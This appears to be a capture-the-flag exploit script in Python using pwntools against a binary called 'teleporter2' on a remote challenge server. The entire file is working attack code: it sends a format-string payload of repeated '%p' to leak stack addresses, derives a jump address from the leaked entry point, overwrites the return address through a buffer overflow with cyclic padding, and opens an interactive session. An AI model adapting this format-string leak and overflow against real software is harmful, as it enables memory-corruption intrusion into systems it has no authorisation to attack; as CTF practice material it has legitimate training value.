from pwn import remote, cyclic_find, p64

# e = process("./teleporter2")
e = remote("challenges.lucideus.in", 13337)

e.sendlineafter("Name please:\n", '%p,'*60)
leak = e.recvuntil("Secret:\n").split(b',')

jump_offset = 0xf2

entry_point = int(leak[-15], 16)

main = entry_point + int('0x2d', 16)

jump = main - jump_offset

padding = b'A'*cyclic_find('maac')

e.sendline(b"it5 a b1g 5t0ry\x00"+padding+p64(jump + 0x12)+p64(jump))

e.interactive()
